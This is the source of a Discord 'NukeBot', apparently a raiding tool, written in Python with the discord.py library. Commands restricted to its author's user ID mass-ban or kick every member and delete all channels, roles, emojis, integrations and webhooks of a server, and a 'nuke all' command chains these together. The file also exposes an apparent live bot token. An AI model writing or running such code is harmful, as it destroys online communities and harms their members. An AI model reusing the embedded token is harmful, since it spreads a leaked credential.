#NukeBot by Gytis#9668

import discord.utils
import discord
import asyncio
import random
from discord.ext import commands
from discord.utils import get

client = commands.Bot(command_prefix = 'nuke ', intents=discord.Intents.all())
client.remove_command('help')

def is_gytis(ctx):
    return ctx.author.id in [301014178703998987]
    #Me

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name=f"nuke help"))
    print('NukeBot now online.')
    print(f'We are running with {round(client.latency * 100)}ms ping.')

@client.command()
@commands.check(is_gytis)
async def ban(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass

@client.command()
@commands.check(is_gytis)
async def kick(ctx):
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            pass

@client.command()
@commands.check(is_gytis)
async def channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

@client.command()
@commands.check(is_gytis)
async def roles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass

@client.command()
@commands.check(is_gytis)
async def emojis(ctx):
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except:
            pass

@client.command()
@commands.check(is_gytis)
async def integrations(ctx):
    for integration in await ctx.guild.integrations():
        try:
            await integration.delete()
        except:
            pass
    for webhook in await ctx.guild.webhooks():
        try:
            await webhook.delete()
        except:
            pass

@client.command()
@commands.check(is_gytis)
async def all(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except:
            pass
    for integration in await ctx.guild.integrations():
        try:
            await integration.delete()
        except:
            pass
    for webhook in await ctx.guild.webhooks():
        try:
            await webhook.delete()
        except:
            pass

@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="Help",
        colour=0x000000,
        description="`nuke ban` - Bans all members\n`nuke kick` - Kicks all members\n`nuke channels` - Deletes all channels\n`nuke roles` - Deletes all roles\n`nuke emojis` - Deletes all emojis\n`nuke integrations` - Deletes all integrations\n`nuke all` - Performs everything previously stated"
    )
    await ctx.send(embed=embed)

client.run('ODYxNjE0MTcyNTAzOTMyOTg5.YOMWug.FajKOL4m_XGOekqBfq0jJV2XBFo')